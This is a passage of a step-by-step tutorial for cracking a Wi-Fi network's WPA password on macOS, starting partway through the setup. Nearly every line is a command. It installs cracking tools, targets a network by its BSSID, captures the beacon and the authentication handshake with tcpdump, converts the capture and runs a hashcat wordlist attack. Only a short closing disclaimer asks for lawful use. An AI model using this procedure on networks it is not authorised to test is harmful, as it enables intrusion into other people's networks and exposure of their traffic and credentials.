sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
Step 2: Install Hashcat
brew install hashcat

** Step 3: Clone and Compile Hashcat Utils**

git clone https://github.com/hashcat/hashcat-utils.git
cd hashcat-utils/src
gcc -o cap2hccapx cap2hccapx.c
sudo mv ./cap2hccapx /usr/local/bin/

**Step 4: Install Hcxtools**
brew install hcxtools*
Step 5: Install Wireshark

brew install wireshark ( tshark )
Step 6: Scan for Wireless Networks

sudo airport -s
Step 7: Set the BSSID Variable

export BSSID=<BSSID of the target network>
Step 8: List All Network Hardware Ports

networksetup -listallhardwareports
Step 9: Disconnect from the Current Wireless Network

sudo airport -z
Step 10: Connect to a Specific Wireless Channel

sudo airport -c1
Step 11: Set the BSSID Variable Again

export BSSID=6e:57:ca:24:09:8c
Step 12: Capture a Beacon Frame
s

sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap
Step 13: Capture the Handshake

export BSSID=6e:57:ca:24:09:8c
sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
Step 14: Merge the Captured Packets

mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
Step 15: Convert the Capture to Hashcat Format

cap2hccapx capture.cap capture.hccapx
Step 16: Use Hashcat to Crack the Password

hashcat -m 2500 capture.hccapx wordlist.txt
Remember to replace <BSSID of the target network> with the actual BSSID of the network you are analyzing. Also, replace en0 with the appropriate interface name if your wireless interface is different. You can find the interface name using the command provided in Step 8.

Please use these instructions responsibly and always comply with laws and regulations regarding network security and penetration testing. Unauthorized access to computer networks is illegal and unethical.
